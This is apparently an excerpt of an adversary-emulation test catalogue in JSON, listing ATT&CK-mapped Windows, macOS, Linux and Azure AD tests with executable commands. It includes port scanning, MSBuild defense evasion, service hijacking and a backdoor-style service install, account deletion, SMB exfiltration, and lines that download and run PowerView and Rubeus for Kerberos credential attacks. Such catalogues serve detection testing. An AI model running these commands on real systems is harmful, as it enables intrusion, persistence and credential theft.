			}
		},
		"executor": {
			"command": "$ipAddr = \"#{ip_address}\"\nif ($ipAddr -eq \"\") {\n    # Assumes the \"primary\" interface is shown at the top\n    $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1\n    Write-Host \"[i] Using Interface $interface\"\n    $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress\n}\nWrite-Host \"[i] Base IP-Address for Subnet: $ipAddr\"\n$subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)\n# Always assumes /24 subnet\nWrite-Host \"[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'\"\n\n$ports = #{port_list}\n$subnetIPs = 1..254 | ForEach-Object { \"$subnetSubstring$_\" }\n\nforeach ($ip in $subnetIPs) {\n    foreach ($port in $ports) {\n      try {\n          $tcp = New-Object Net.Sockets.TcpClient\n          $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null\n      } catch {}\n      if ($tcp.Connected) {\n          $tcp.Close()\n          Write-Host \"Port $port is open on $ip\"\n      }\n    }\n}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1046",
		"phases": ["discovery"]
	},
	{
		"name": "Remote Desktop Services Discovery via PowerShell",
		"auto_generated_guid": "9e55750e-4cbf-4013-9627-e9a045b541bf",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Get-Service -Name \"Remote Desktop Services\", \"Remote Desktop Configuration\"\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1046",
		"phases": ["discovery"]
	},
	{
		"name": "MSBuild Bypass Using Inline Tasks (C#)",
		"auto_generated_guid": "58742c0f-cb01-44cd-a60b-fb26e8871c93",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"filename": {
				"description": "Location of the project file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1127.001\\src\\T1127.001.csproj"
			},
			"msbuildpath": {
				"description": "Default location of MSBuild",
				"type": "path",
				"default": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319"
			},
			"msbuildname": {
				"description": "Default name of MSBuild",
				"type": "path",
				"default": "msbuild.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Project file must exist on disk at specified location (#{filename})\n",
				"prereq_command": "if (Test-Path \"#{filename}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{filename}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127.001/src/T1127.001.csproj\" -OutFile \"#{filename}\"\n"
			}
		],
		"executor": {
			"command": "#{msbuildpath}\\#{msbuildname} \"#{filename}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1127.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "MSBuild Bypass Using Inline Tasks (VB)",
		"auto_generated_guid": "ab042179-c0c5-402f-9bc8-42741f5ce359",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"filename": {
				"description": "Location of the project file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1127.001\\src\\vb.xml"
			},
			"msbuildpath": {
				"description": "Default location of MSBuild",
				"type": "path",
				"default": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319"
			},
			"msbuildname": {
				"description": "Default name of MSBuild",
				"type": "path",
				"default": "msbuild.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Project file must exist on disk at specified location (#{filename})\n",
				"prereq_command": "if (Test-Path \"#{filename}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{filename}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127.001/src/vb.xml\" -OutFile \"#{filename}\"\n"
			}
		],
		"executor": {
			"command": "#{msbuildpath}\\#{msbuildname} \"#{filename}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1127.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Add Network Share",
		"auto_generated_guid": "14c38f32-6509-46d8-ab43-d53e32d2b131",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"share_name": {
				"description": "Share to add.",
				"type": "string",
				"default": "\\\\test\\share"
			}
		},
		"executor": {
			"command": "net use c: #{share_name}\nnet share test=#{share_name} /REMARK:\"test share\" /CACHE:No\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1070.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Remove Network Share",
		"auto_generated_guid": "09210ad5-1ef2-4077-9ad3-7351e13e9222",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"share_name": {
				"description": "Share to remove.",
				"type": "string",
				"default": "\\\\test\\share"
			}
		},
		"executor": {
			"command": "net share #{share_name} /delete\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1070.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Remove Network Share PowerShell",
		"auto_generated_guid": "0512d214-9512-4d22-bde7-f37e058259b3",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"share_name": {
				"description": "Share to remove.",
				"type": "string",
				"default": "\\\\test\\share"
			}
		},
		"executor": {
			"command": "Remove-SmbShare -Name #{share_name}\nRemove-FileShare -Name #{share_name}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1070.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Administrative Share Creation at Startup",
		"auto_generated_guid": "99c657aa-ebeb-4179-a665-69288fdd12b8",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /f\nreg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1070.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Remove Administrative Shares",
		"auto_generated_guid": "4299eff5-90f1-4446-b2f3-7f4f5cfd5d62",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "for %i in (C$ IPC$ ADMIN$) do net share %i /delete",
			"cleanup_command": "net share ADMIN$ /UNLIMITED >nul 2>&1\nnet share C$=C:\\ >nul 2>&1\nnet share IPC$ >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1070.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Change User Password - Windows",
		"auto_generated_guid": "1b99ef28-f83c-4ec5-8a08-1a56263a5bb2",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"user_account": {
				"description": "User account whose password will be changed.",
				"type": "string",
				"default": "AtomicAdministrator"
			},
			"new_user_password": {
				"description": "Password to use if user account must be created first",
				"type": "string",
				"default": "User2ChangePW!"
			},
			"new_password": {
				"description": "New password for the specified account.",
				"type": "string",
				"default": "HuHuHUHoHo283283@dJD"
			}
		},
		"executor": {
			"command": "net user #{user_account} #{new_user_password} /add\nnet.exe user #{user_account} #{new_password}\n",
			"cleanup_command": "net.exe user #{user_account} /delete >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1531",
		"phases": ["impact"]
	},
	{
		"name": "Delete User - Windows",
		"auto_generated_guid": "f21a1d7d-a62f-442a-8c3a-2440d43b19e5",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"new_user_password": {
				"description": "Password to use if user account must be created first",
				"type": "string",
				"default": "User2DeletePW!"
			},
			"user_account": {
				"description": "User account to be deleted.",
				"type": "string",
				"default": "AtomicUser"
			}
		},
		"executor": {
			"command": "net user #{user_account} #{new_user_password} /add\nnet.exe user #{user_account} /delete\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1531",
		"phases": ["impact"]
	},
	{
		"name": "Remove Account From Domain Admin Group",
		"auto_generated_guid": "43f71395-6c37-498e-ab17-897d814a0947",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Requires the Active Directory module for powershell to be installed.\n",
				"prereq_command": "if(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Add-WindowsCapability -Online -Name \"Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0\"\n"
			}
		],
		"input_arguments": {
			"super_user": {
				"description": "Account used to run the execution command (must include domain).",
				"type": "string",
				"default": "domain\\super_user"
			},
			"super_pass": {
				"description": "super_user account password.",
				"type": "string",
				"default": "password"
			},
			"remove_user": {
				"description": "Account to remove from domain admins.",
				"type": "string",
				"default": "remove_user"
			}
		},
		"executor": {
			"command": "$PWord = ConvertTo-SecureString -String #{super_pass} -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{super_user}, $PWord\nif((Get-ADUser #{remove_user} -Properties memberof).memberof -like \"CN=Domain Admins*\"){\n  Remove-ADGroupMember -Identity \"Domain Admins\" -Members #{remove_user} -Credential $Credential -Confirm:$False\n} else{\n    write-host \"Error - Make sure #{remove_user} is in the domain admins group\" -foregroundcolor Red\n}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1531",
		"phases": ["impact"]
	},
	{
		"name": "Change User Password via passwd",
		"auto_generated_guid": "3c717bf3-2ecc-4d79-8ac8-0bfbf08fbce6",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"user_account": {
				"description": "User account whose password will be changed.",
				"type": "string",
				"default": "ARTUser"
			}
		},
		"executor": {
			"command": "passwd #{user_account} #enter admin password > enter new password > confirm new password\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1531",
		"phases": ["impact"]
	},
	{
		"name": "Delete User via dscl utility",
		"auto_generated_guid": "4d938c43-2fe8-4d70-a5b3-5bf239aa7846",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"user_account": {
				"description": "User account which will be deleted.",
				"type": "string",
				"default": "ARTUser"
			},
			"user_password": {
				"description": "User password.",
				"type": "string",
				"default": "ARTPassword"
			}
		},
		"executor": {
			"command": "dscl . -delete /Users/#{user_account} #enter admin password\n",
			"cleanup_command": "dscl . -create /Users/#{user_account} #enter admin password\ndscl . -create /Users/#{user_account} UserShell /bin/bash\ndscl . -create /Users/#{user_account} UniqueID 503\ndscl . -create /Users/#{user_account} NFSHomeDirectory /Users/#{user_account}\ndscl . -passwd /Users/#{user_account} #{user_password} #enter password for new user\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1531",
		"phases": ["impact"]
	},
	{
		"name": "Delete User via sysadminctl utility",
		"auto_generated_guid": "d3812c4e-30ee-466a-a0aa-07e355b561d6",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"user_account": {
				"description": "User account which will be deleted.",
				"type": "string",
				"default": "ARTUserAccount"
			},
			"user_name": {
				"description": "New user name.",
				"type": "string",
				"default": "ARTUser"
			},
			"user_password": {
				"description": "New user password.",
				"type": "string",
				"default": "ARTPassword"
			}
		},
		"executor": {
			"command": "sysadminctl -deleteUser #{user_account} #enter admin password\n",
			"cleanup_command": "sysadminctl -addUser #{user_account} -fullName \"#{user_name}\" -password #{user_password}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1531",
		"phases": ["impact"]
	},
	{
		"name": "Azure AD - Delete user via Azure AD PowerShell",
		"auto_generated_guid": "4f577511-dc1c-4045-bcb8-75d2457f01f4",
		"supported_platforms": ["azure-ad"],
		"input_arguments": {
			"userprincipalname": {
				"description": "User principal name (UPN) for the Azure user being deleted",
				"type": "string",
				"default": "atomicredteam@yourdomain.com"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Check if AzureAD PowerShell module is installed",
				"prereq_command": "Get-InstalledModule -Name AzureAD",
				"get_prereq_command": "echo \"use the following to install AzureAD PowerShell module - Install-Module -Name AzureAD -Scope CurrentUser -Repository PSGallery -Force\""
			},
			{
				"description": "Check if AzureAD PowerShell module is installed",
				"prereq_command": "Update the input arguments so the userprincipalname value is accurate for your environment",
				"get_prereq_command": "echo \"Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment\""
			}
		],
		"executor": {
			"command": "Connect-AzureAD\n$userprincipalname = \"#{userprincipalname}\"\nRemove-AzureADUser -ObjectId $userprincipalname",
			"cleanup_command": "N/A",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1531",
		"phases": ["impact"]
	},
	{
		"name": "Azure AD - Delete user via Azure CLI",
		"auto_generated_guid": "c955c1c7-3145-4a22-af2d-63eea0d967f0",
		"supported_platforms": ["azure-ad"],
		"input_arguments": {
			"userprincipalname": {
				"description": "User principal name (UPN) for the Azure user being deleted",
				"type": "string",
				"default": "atomicredteam@yourdomain.com"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Check if Azure CLI is installed and install manually",
				"prereq_command": "az account list",
				"get_prereq_command": "echo \"use the following to install the Azure CLI manually https://aka.ms/installazurecliwindows\""
			},
			{
				"description": "Check if Azure CLI is installed and install via PowerShell",
				"prereq_command": "az account list",
				"get_prereq_command": "echo \"use the following to install the Azure CLI $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; Remove-Item .\\AzureCLI.msi\""
			},
			{
				"description": "Update the userprincipalname to meet your requirements",
				"prereq_command": "Update the input arguments so the userprincipalname value is accurate for your environment",
				"get_prereq_command": "echo \"Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment\""
			}
		],
		"executor": {
			"command": "az login\n$userprincipalname = \"#{userprincipalname}\"\naz ad user delete --id $userprincipalname",
			"cleanup_command": "N/A",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1531",
		"phases": ["impact"]
	},
	{
		"name": "Modify Fax service to run PowerShell",
		"auto_generated_guid": "ed366cde-7d12-49df-a833-671904770b9f",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "command_prompt",
			"elevation_required": true,
			"command": "sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\"\nsc start Fax\n",
			"cleanup_command": "sc config Fax binPath= \"C:\\WINDOWS\\system32\\fxssvc.exe\" >nul 2>&1"
		},
		"attack_technique": "T1543.003",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Service Installation CMD",
		"auto_generated_guid": "981e2942-e433-44e9-afc1-8c957a1496b6",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"binary_path": {
				"description": "Name of the service binary, include path.",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe"
			},
			"service_type": {
				"description": "Type of service. May be own|share|interact|kernel|filesys|rec|userown|usershare",
				"type": "string",
				"default": "Own"
			},
			"startup_type": {
				"description": "Service start method. May be boot|system|auto|demand|disabled|delayed-auto",
				"type": "string",
				"default": "auto"
			},
			"service_name": {
				"description": "Name of the Service",
				"type": "string",
				"default": "AtomicTestService_CMD"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Service binary must exist on disk at specified location (#{binary_path})\n",
				"prereq_command": "if (Test-Path \"#{binary_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{binary_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe\" -OutFile \"#{binary_path}\"\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"elevation_required": true,
			"command": "sc.exe create #{service_name} binPath= \"#{binary_path}\" start=#{startup_type}  type=#{service_type}\nsc.exe start #{service_name}\n",
			"cleanup_command": "sc.exe stop #{service_name} >nul 2>&1\nsc.exe delete #{service_name} >nul 2>&1\n"
		},
		"attack_technique": "T1543.003",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Service Installation PowerShell",
		"auto_generated_guid": "491a4af6-a521-4b74-b23b-f7b3f1ee9e77",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"binary_path": {
				"description": "Name of the service binary, include path.",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe"
			},
			"service_name": {
				"description": "Name of the Service",
				"type": "string",
				"default": "AtomicTestService_PowerShell"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Service binary must exist on disk at specified location (#{binary_path})\n",
				"prereq_command": "if (Test-Path \"#{binary_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{binary_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe\" -OutFile \"#{binary_path}\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": true,
			"command": "New-Service -Name \"#{service_name}\" -BinaryPathName \"#{binary_path}\"\nStart-Service -Name \"#{service_name}\"\n",
			"cleanup_command": "Stop-Service -Name \"#{service_name}\" 2>&1 | Out-Null\ntry {(Get-WmiObject Win32_Service -filter \"name='#{service_name}'\").Delete()}\ncatch {}\n"
		},
		"attack_technique": "T1543.003",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "TinyTurla backdoor service w64time",
		"auto_generated_guid": "ef0581fd-528e-4662-87bc-4c2affb86940",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"dllfilename": {
				"description": "It specifies Dll file to run as service",
				"type": "string",
				"default": "$PathToAtomicsFolder\\T1543.003\\bin\\w64time.dll"
			}
		},
		"executor": {
			"command": "copy \"#{dllfilename}\" %systemroot%\\system32\\\nsc create W64Time binPath= \"c:\\Windows\\System32\\svchost.exe -k TimeService\" type= share start=auto\nsc config W64Time DisplayName= \"Windows 64 Time\"\nsc description W64Time \"Maintain date and time synch on all clients and services in the network\"\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v TimeService /t REG_MULTI_SZ /d \"W64Time\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\w64time.dll\" /f\nsc start W64Time",
			"cleanup_command": "sc stop W64Time\nsc.exe delete W64Time\ndel %systemroot%\\system32\\w64time.dll\nreg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v TimeService /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters\" /v ServiceDll /f",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1543.003",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Remote Service Installation CMD",
		"auto_generated_guid": "fb4151a2-db33-4f8c-b7f8-78ea8790f961",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"binary_path": {
				"description": "Name of the service binary, include path.",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe"
			},
			"service_type": {
				"description": "Type of service. May be own,share,interact,kernel,filesys,rec,userown,usershare",
				"type": "string",
				"default": "Own"
			},
			"startup_type": {
				"description": "Service start method. May be boot,system,auto,demand,disabled,delayed-auto",
				"type": "string",
				"default": "auto"
			},
			"service_name": {
				"description": "Name of the Service",
				"type": "string",
				"default": "AtomicTestService_CMD"
			},
			"remote_host": {
				"description": "Name of the remote endpoint",
				"type": "string",
				"default": "localhost"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Service binary must exist on disk at specified location (#{binary_path})\n",
				"prereq_command": "if (Test-Path \"#{binary_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{binary_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe\" -OutFile \"#{binary_path}\"\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"elevation_required": true,
			"command": "sc.exe \\\\#{remote_host} create #{service_name} binPath= \"#{binary_path}\" start=#{startup_type} type=#{service_type}\nsc.exe \\\\#{remote_host} start #{service_name}\n",
			"cleanup_command": "sc.exe \\\\#{remote_host} stop #{service_name} >nul 2>&1\nsc.exe \\\\#{remote_host} delete #{service_name} >nul 2>&1\n"
		},
		"attack_technique": "T1543.003",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Modify Service to Run Arbitrary Binary (Powershell)",
		"auto_generated_guid": "1f896ce4-8070-4959-8a25-2658856a70c9",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"service_name": {
				"description": "Name of the service to modify",
				"type": "string",
				"default": "fax"
			},
			"new_bin_path": {
				"description": "Path of the new service binary",
				"type": "String",
				"default": "$env:windir\\system32\\notepad.exe"
			},
			"original_bin_path": {
				"description": "Path of the original service binary",
				"type": "String",
				"default": "$env:windir\\system32\\fxssvc.exe"
			}
		},
		"executor": {
			"command": "Stop-Service -Name \"#{service_name}\" -force -erroraction silentlycontinue | Out-Null\nset-servicebinarypath -name \"#{service_name}\" -path \"#{new_bin_path}\"\nstart-service -Name \"#{service_name}\" -erroraction silentlycontinue | out-null",
			"cleanup_command": "Stop-Service -Name \"#{service_name}\" -force -erroraction silentlycontinue | Out-Null\nset-servicebinarypath -name \"#{service_name}\" -path \"#{original_bin_path}\" -erroraction silentlycontinue | out-null",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1543.003",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Exfiltration Over SMB over QUIC (New-SmbMapping)",
		"auto_generated_guid": "d8d13303-159e-4f33-89f4-9f07812d016f",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_path": {
				"description": "The UNC path to the share on the file server",
				"type": "string",
				"default": "\\\\example.com\\sales"
			},
			"local_file": {
				"description": "The local file to be transferred",
				"type": "path",
				"default": "C:\\path\\to\\file.txt"
			}
		},
		"executor": {
			"command": "New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck\ncopy '#{local_file}' 'Z:\\'\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1570",
		"phases": ["lateral-movement"]
	},
	{
		"name": "Exfiltration Over SMB over QUIC (NET USE)",
		"auto_generated_guid": "183235ca-8e6c-422c-88c2-3aa28c4825d9",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_path": {
				"description": "The UNC path to the share on the file server",
				"type": "string",
				"default": "\\\\example.com\\sales"
			},
			"local_file": {
				"description": "The local file to be transferred",
				"type": "path",
				"default": "C:\\path\\to\\file.txt"
			}
		},
		"executor": {
			"command": "NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK\ncopy '#{local_file}' '*:\\'\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1570",
		"phases": ["lateral-movement"]
	},
	{
		"name": "SyncAppvPublishingServer Signed Script PowerShell Command Execution",
		"auto_generated_guid": "275d963d-3f36-476c-8bef-a2a3960ee6eb",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"command_to_execute": {
				"description": "A PowerShell command to execute.",
				"type": "string",
				"default": "Start-Process calc"
			}
		},
		"executor": {
			"command": "C:\\windows\\system32\\SyncAppvPublishingServer.vbs \"\\n;#{command_to_execute}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1216",
		"phases": ["defense-evasion"]
	},
	{
		"name": "manage-bde.wsf Signed Script Command Execution",
		"auto_generated_guid": "2a8f2d3c-3dec-4262-99dd-150cb2a4d63a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"command_to_execute": {
				"description": "A command to execute.",
				"type": "path",
				"default": "%windir%\\System32\\calc.exe"
			}
		},
		"executor": {
			"command": "set comspec=#{command_to_execute}\ncscript %windir%\\System32\\manage-bde.wsf\n",
			"cleanup_command": "set comspec=%windir%\\System32\\cmd.exe\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1216",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Rubeus asreproast",
		"auto_generated_guid": "615bd568-2859-41b5-9aed-61f6a88e48dd",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"local_folder": {
				"description": "Local path of Rubeus executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads"
			},
			"local_executable": {
				"description": "name of the rubeus executable",
				"type": "string",
				"default": "rubeus.exe"
			},
			"out_file": {
				"description": "file where command results are stored",
				"type": "string",
				"default": "rubeus_output.txt"
			},
			"rubeus_url": {
				"description": "URL of Rubeus executable",
				"type": "url",
				"default": "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Computer must be domain joined\n",
				"prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
			},
			{
				"description": "Rubeus must exist\n",
				"prereq_command": "if(Test-Path -Path \"#{local_folder}\\#{local_executable}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\\#{local_executable}\n"
			}
		],
		"executor": {
			"command": "cmd.exe /c \"#{local_folder}\\#{local_executable}\" asreproast /outfile:\"#{local_folder}\\#{out_file}\"\n",
			"cleanup_command": "Remove-Item \"#{local_folder}\\#{out_file}\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1558.004",
		"phases": ["credential-access"]
	},
	{
		"name": "Get-DomainUser with PowerView",
		"auto_generated_guid": "d6139549-7b72-4e48-9ea1-324fc9bdf88a",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1558.004",
		"phases": ["credential-access"]
	},
	{
		"name": "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus",
		"auto_generated_guid": "8c385f88-4d47-4c9a-814d-93d9deec8c71",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"asreproast /format:hashcat /nowrap\"",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1558.004",
		"phases": ["credential-access"]
	},
	{
		"name": "System Owner/User Discovery",
		"auto_generated_guid": "4c4959bf-addf-4b4a-be86-8d09cc1857aa",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"computer_name": {
				"description": "Name of remote computer",
				"type": "string",
				"default": "localhost"
			}
		},
		"executor": {
			"command": "cmd.exe /C whoami\nwmic useraccount get /ALL\nquser /SERVER:\"#{computer_name}\"\nquser\nqwinsta.exe /server:#{computer_name}\nqwinsta.exe\nfor /F \"tokens=1,2\" %i in ('qwinsta /server:#{computer_name} ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt\n@FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1033",
		"phases": ["discovery"]
	},
	{
		"name": "System Owner/User Discovery",
		"auto_generated_guid": "2a9b677d-a230-44f4-ad86-782df1ef108c",
		"supported_platforms": ["linux", "macos"],
		"executor": {
			"command": "users\nw\nwho\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1033",
		"phases": ["discovery"]
	},
	{
		"name": "Find computers where user has session - Stealth mode (PowerView)",
		"auto_generated_guid": "29857f27-a36f-4f7e-8084-4557cd6207ca",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose\n",
			"name": "powershell",
			"elevation_required": false
		},
